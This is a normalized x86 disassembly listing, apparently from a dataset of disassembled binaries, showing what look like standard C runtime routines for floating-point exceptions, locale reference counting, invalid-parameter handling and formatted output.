xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_428f9f
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_428faf
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_4289f4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_428718
add esp 0x1c
pop ebp
retn
sub_428a17
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_428718
add esp 0x1c
pop ebp
retn
sub_428a3a
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_428feb
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_428feb
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_428feb
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_428feb
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_42815a
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_428feb
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_428c1e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_4268f3
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_4268f3
mov [ eax ] 0x22
pop ebp
retn
sub_428c4b
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x1d
jl r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
xor eax eax
pop ebp
retn
sub_428c71
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_428ca5
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_428fc0
push [ ebp + 0x8 ]
call sub_428c1e
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_428fc0
lea eax [ ebp - 0x20 ]
push eax
call sub_431a3d
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_428c1e
pop ecx
sub_428d45
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
call sub_4268f3
push 0xffff
push [ ebp + 0x14 ]
mov [ eax ] 0x21
call sub_428fc0
fld [ ebp + 0xc ]
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x14 ]
fld [ ebp + 0xc ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_428ca5
add esp 0x24
pop ebp
retn
sub_428d9a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
fld [ ebp + 0xc ]
fadd [ ebp + 0x14 ]
fstp [ ebp - 0x8 ]
jne r-xdata
call sub_4268f3
push 0xffff
push [ ebp + 0x1c ]
mov [ eax ] 0x21
call sub_428fc0
fld [ ebp - 0x8 ]
pop ecx
pop ecx
leave
retn
push [ ebp + 0x1c ]
fld [ ebp - 0x8 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x14 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_428ca5
add esp 0x24
leave
retn
sub_428dfb
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push eax
push [ ebx + 0x8 ]
call sub_428a3a
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_428c71
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0x40 ] 0xfffffffe
push eax
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_428718
add esp 0x1c
push eax
call sub_428c1e
mov [ esp ] 0xffff
push [ ebx + 0x20 ]
call sub_428fc0
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x20 ]
fld [ ebx + 0x18 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_428ca5
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4247dc
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_428ec5
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push eax
push [ ebx + 0x8 ]
call sub_428a3a
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_428c71
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ ebx + 0x18 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
push 0x0
lea eax [ ebx + 0x20 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_428718
add esp 0x1c
push eax
call sub_428c1e
mov [ esp ] 0xffff
push [ ebx + 0x28 ]
call sub_428fc0
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x28 ]
fld [ ebx + 0x20 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_428ca5
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4247dc
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_428fc0
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_428feb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_429061
push 0x8
push r--data
call sub_4278c0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_427905
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_42911b
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
call sub_429043
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
mov esi eax
mov eax [ ebp + 0xc ]
not eax
or eax 0xffff807f
and eax esi
or eax ecx
push eax
call sub_429061
pop ecx
sub_4291fb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_42928a
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_429323
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_42578a
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_42578a
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_42578a
push [ esi + 0xc0 ]
call sub_42578a
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_432d9c
push [ esi + 0xd4 ]
call sub_42578a
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_42578a
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_42578a
pop ecx
push [ esi + 0xb0 ]
call sub_42578a
push [ esi + 0xbc ]
call sub_42578a
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_42578a
push [ esi + 0xbc ]
call sub_433449
pop ecx
pop ecx
push eax
call sub_42578a
pop ecx
push eax
call sub_42578a
push [ esi + 0xbc ]
call sub_4331c0
pop ecx
pop ecx
sub_42946e
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_4291fb
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_42928a
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_429323
pop ecx
sub_4294bb
push 0xc
push r--data
call sub_4278c0
call sub_426c39
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_42946e
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_429528
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_426c39
mov esi [ eax + 0x6c ]
mov eax esi
call sub_427905
retn
push 0x20
call sub_42664d
sub_429543
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_4338e0
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_42afcc
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_42afcc
pop ecx
sub_42966c
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax esi
pop esi
pop ebp
retn
sub_4296a0
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_429543
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_4296df
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4296a0
int3
pop ebp
jmp eax
sub_42971c
xor eax eax
push esi
push eax
push eax
push eax
push eax
push eax
call sub_4296df
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_429543
add esp 0x20
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
int3
sub_429755
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_43395a
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_43395a
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_42984b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_433ba2
call sub_429755
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_429874
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_433ba2
call sub_429755
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_42989e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
pop ebp
retn
call sub_4268f3
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_42970c
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_434827
call sub_429755
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_4268f3
mov [ eax ] 0x22
sub_429934
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test ebx ebx
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
pop ebp
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
